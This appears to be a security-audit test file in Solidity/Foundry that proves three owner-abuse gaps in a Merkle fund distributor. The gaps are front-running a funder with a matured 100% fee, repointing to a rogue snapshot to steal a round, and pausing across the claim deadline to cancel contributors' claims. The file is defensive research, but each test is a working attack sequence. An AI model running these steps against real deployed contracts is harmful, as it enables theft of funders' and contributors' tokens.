// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {RoundPins} from "test/helpers/RoundPins.sol";
import {MerkleFundDistributor} from "src/merkle/MerkleFundDistributor.sol";
import {IMerkleFundDistributor} from "interfaces/IMerkleFundDistributor.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @dev Minimal snapshot stand-in: the distributor only ever calls `getLatestState()`.
contract PT_MockSnapshot is IMerkleSnapshot {
    MerkleState private _state;

    function setMerkleState(MerkleState memory s) external {
        _state = s;
    }

    function getLatestState() external view override returns (MerkleState memory) {
        return _state;
    }
}

contract PT_Token is ERC20 {
    constructor() ERC20("T", "T") {}

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

/// @title PashovTrust_DistributorSeams
/// @notice Three trust-gap proofs against `MerkleFundDistributor`, each combining an access lens
///         (an owner-only lever) with an economic lens (the value a third-party funder commits)
///         and an asymmetry lens (which funder / which claimant class the lever favours).
contract PashovTrust_DistributorSeams is Test {
    PT_MockSnapshot internal snapshot;
    PT_Token internal token;
    MerkleFundDistributor internal dist;

    address internal owner = address(0xA11CE);
    address internal feeRecipient = address(0xFEE);
    address internal funder = address(0xF00D);
    address internal attacker = address(0xBAD);

    // A 2-leaf tree over (alice, 60) and (bob, 40), leaf = keccak(bytes.concat(keccak(abi.encode(acct,val)))).
    address internal alice = address(0xA1);
    address internal bob = address(0xB0);

    bytes32 internal leafAlice;
    bytes32 internal leafBob;
    bytes32 internal realRoot;

    function setUp() public {
        snapshot = new PT_MockSnapshot();
        token = new PT_Token();

        leafAlice = keccak256(bytes.concat(keccak256(abi.encode(alice, uint256(60)))));
        leafBob = keccak256(bytes.concat(keccak256(abi.encode(bob, uint256(40)))));
        realRoot = _pair(leafAlice, leafBob);

        snapshot.setMerkleState(
            IMerkleSnapshot.MerkleState({
                blockNumber: block.number,
                timestamp: block.timestamp,
                root: realRoot,
                ipfsHash: bytes32(uint256(1)),
                ipfsHashCid: "Qm",
                totalValue: 100
            })
        );

        // Exactly the terms `TrustgraphsFactory` / `WeightedTrustgraphsFactory` /
        // `TrustComposeFactory` / `ContributionsFactory` deploy with:
        //   owner = instance admin, feeRecipient = admin, feePercentage = 0, allowlist DISABLED.
        dist = new MerkleFundDistributor(owner, address(snapshot), feeRecipient, 0, false);

        token.mint(funder, 1_000 ether);
        vm.prank(funder);
        token.approve(address(dist), type(uint256).max);
    }

    function _pair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a <= b ? keccak256(abi.encode(a, b)) : keccak256(abi.encode(b, a));
    }

    /*//////////////////////////////////////////////////////////////
        SEAM 1 — access x economics x asymmetry:
        a MATURED-but-unapplied fee increase is a permanently loaded gun.

        `FEE_INCREASE_DELAY` (the M-7 remediation) delays only the SCHEDULING.
        `applyFeePercentageIncrease()` is permissionless, has no expiry, and takes
        effect atomically, so the owner can hold a matured 100% increase for months
        and fire it in the block in front of any funder's `distribute`. The funder
        who read `feePercentage()` (still 0) gets no warning at all.
    //////////////////////////////////////////////////////////////*/
    function test_Seam1_MaturedFeeIncreaseIsALoadedGun() public {
        // t0: owner schedules the maximum increase. Live fee is UNCHANGED.
        vm.prank(owner);
        dist.setFeePercentage(1e18); // 100%
        assertEq(dist.feePercentage(), 0, "live fee still 0 at scheduling time");
        assertEq(dist.pendingFeePercentage(), 1e18);
        uint64 effectiveAt = dist.pendingFeeEffectiveAt();
        assertEq(effectiveAt, uint64(block.timestamp) + dist.FEE_INCREASE_DELAY());

        // t0 + 3 days: the increase matures but NOBODY applies it. There is no expiry.
        vm.warp(effectiveAt);
        // ... and it is still unapplied 200 days later. This is the whole point:
        // the "notice" the funder was supposed to get has scrolled off the chain.
        vm.warp(effectiveAt + 200 days);
        assertEq(dist.feePercentage(), 0, "live fee STILL 0 after 200 days of notice elapsing");

        // A funder reads the live fee, sees 0, and signs `distribute`.
        uint256 amount = 100 ether;

        // The owner front-runs it with the one permissionless, 30k-gas call that arms the fee.
        // (Anyone may call this; the owner is simply the one with the incentive.)
        vm.prank(owner);
        dist.applyFeePercentageIncrease();
        assertEq(dist.feePercentage(), 1e18, "fee is now 100% in the same block as the funder's tx");

        uint256 feeRecipientBefore = token.balanceOf(feeRecipient);

        RoundPins.Pins memory _pins0 = RoundPins.read(dist, amount);
        vm.prank(funder);
        uint256 idx = dist.distribute(
            address(token), amount, _pins0.root, _pins0.totalValue, 0, type(uint256).max, _pins0.feeRecipient
        );

        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(idx);
        assertEq(d.amountFunded, amount);
        assertEq(d.feeAmount, amount, "100% of the funder's round was taken as fee");
        assertEq(token.balanceOf(feeRecipient) - feeRecipientBefore, amount, "fee recipient took everything");

        // Every contributor in the proven scoreboard now gets zero.
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = leafBob;
        vm.expectRevert(IMerkleFundDistributor.NoFundsToClaim.selector);
        dist.claim(idx, alice, 60, proof);

        // The M-7 guarded overload IS protected, which is exactly the asymmetry:
        // only funders who opt into the guarded form are covered.
        vm.prank(funder);
        vm.expectRevert(abi.encodeWithSelector(IMerkleFundDistributor.FeeExceedsFunderCap.selector, amount, 0));
        dist.distribute(address(token), amount, bytes32(0), 100, 0, 0, feeRecipient);
    }

    /*//////////////////////////////////////////////////////////////
        SEAM 2 — access x economics x asymmetry:
        `setMerkleSnapshot` is the strictly MORE powerful sibling of
        `setFeePercentage`, and it has no delay and no funder-side guard.

        The M-7 remediation delayed fee increases and gave funders
        `maxFeeAmount` / `expectedFeeRecipient`. Neither covers the ROOT, which
        decides WHO the money goes to. `expectedRoot` exists but is optional and
        the factory-created UX passes 0. So the owner can point the distributor at
        a snapshot they wrote, whose "scoreboard" is a single leaf for themselves,
        and take 100% of the next funder's round with no fee at all.
    //////////////////////////////////////////////////////////////*/
    function test_Seam2_SnapshotRepointStealsTheNextFundersRound() public {
        // Owner deploys a snapshot-shaped contract whose entire scoreboard is themselves.
        PT_MockSnapshot rogue = new PT_MockSnapshot();
        bytes32 rogueLeaf = keccak256(bytes.concat(keccak256(abi.encode(attacker, uint256(1)))));
        rogue.setMerkleState(
            IMerkleSnapshot.MerkleState({
                blockNumber: block.number,
                timestamp: block.timestamp,
                root: rogueLeaf, // single-leaf tree: the root IS the leaf
                ipfsHash: bytes32(uint256(2)),
                ipfsHashCid: "Qm2",
                totalValue: 1
            })
        );

        // No delay, no event the funder's wallet would surface as a fee change, no guard.
        vm.prank(owner);
        dist.setMerkleSnapshot(address(rogue));

        // The funder's unguarded `distribute` (expectedRoot = 0, the UX default) lands.
        uint256 amount = 100 ether;
        RoundPins.Pins memory _pins1 = RoundPins.read(dist, amount);
        vm.prank(funder);
        uint256 idx = dist.distribute(
            address(token), amount, _pins1.root, _pins1.totalValue, 0, type(uint256).max, _pins1.feeRecipient
        );

        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(idx);
        assertEq(d.root, rogueLeaf, "round pinned to the owner's own tree");
        assertEq(d.feeAmount, 0, "no fee was charged - the M-7 fee guards see nothing wrong");

        // The owner drains the whole round through a normal claim.
        uint256 before = token.balanceOf(attacker);
        bytes32[] memory emptyProof = new bytes32[](0);
        dist.claim(idx, attacker, 1, emptyProof);
        assertEq(token.balanceOf(attacker) - before, amount, "owner took 100% of a third party's round");

        // The real contributors cannot claim anything from this distribution.
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = leafBob;
        vm.expectRevert(IMerkleFundDistributor.InvalidMerkleProof.selector);
        dist.claim(idx, alice, 60, proof);
    }

    /*//////////////////////////////////////////////////////////////
        SEAM 3 — access x economics x asymmetry:
        `pause()` stops claims but does NOT stop the claim deadline.

        `claim` is `whenNotPaused` and closes hard at `claimDeadline`; `sweep`
        returns the remainder to the FUNDER. So an owner who pauses across the
        deadline converts every unclaimed contributor entitlement into a refund to
        the funder - a value transfer between two user classes produced purely by
        an owner-only safety lever.
    //////////////////////////////////////////////////////////////*/
    function test_Seam3_PauseAcrossDeadlineConvertsClaimsIntoAFunderRefund() public {
        uint64 deadline = uint64(block.timestamp + 7 days);
        uint256 amount = 100 ether;

        RoundPins.Pins memory _pins2 = RoundPins.read(dist, amount);
        vm.prank(funder);
        uint256 idx = dist.distribute(
            address(token), amount, _pins2.root, _pins2.totalValue, deadline, type(uint256).max, _pins2.feeRecipient
        );

        // Alice could claim 60% right now.
        bytes32[] memory proofA = new bytes32[](1);
        proofA[0] = leafBob;

        // Owner pauses one second into the window.
        vm.warp(block.timestamp + 1);
        vm.prank(owner);
        dist.pause();

        vm.expectRevert(abi.encodeWithSignature("EnforcedPause()"));
        dist.claim(idx, alice, 60, proofA);

        // The deadline keeps running while paused.
        vm.warp(uint256(deadline) + 1);
        vm.prank(owner);
        dist.unpause();

        // Claims are now permanently closed - Alice's 60 ether entitlement is gone.
        vm.expectRevert(IMerkleFundDistributor.ClaimWindowClosed.selector);
        dist.claim(idx, alice, 60, proofA);

        // ...and anyone may hand the whole pot back to the funder.
        uint256 before = token.balanceOf(funder);
        uint256 swept = dist.sweep(idx);
        assertEq(swept, amount, "100% of the round returned to the funder");
        assertEq(token.balanceOf(funder) - before, amount);
    }
}
